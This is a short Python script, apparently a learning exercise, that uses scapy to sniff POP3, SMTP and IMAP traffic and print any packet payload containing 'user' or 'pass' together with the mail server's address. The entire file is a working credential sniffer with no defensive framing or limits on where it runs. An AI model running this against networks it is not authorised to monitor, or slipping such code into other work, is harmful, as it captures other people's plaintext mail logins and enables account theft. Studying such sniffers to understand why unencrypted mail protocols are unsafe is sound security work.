#!/bin/python

# Imported as a module to get general feel about the difference between importing just functions vs module
import scapy.all as scapy


# Packet callback
def packet_callback(packet):

    if packet[scapy.TCP].payload:

        mail_packet = str(packet[scapy.TCP].payload)

        if 'user' in mail_packet.lower() or 'pass' in mail_packet.lower():

            print('[*] Server: %s' % packet[scapy.IP].dst)
            print('[*] %s' % packet[scapy.TCP].payload)


scapy.sniff(filter='tcp port 110 or tcp port 25 or tcp port 143', prn=packet_callback, store=0)
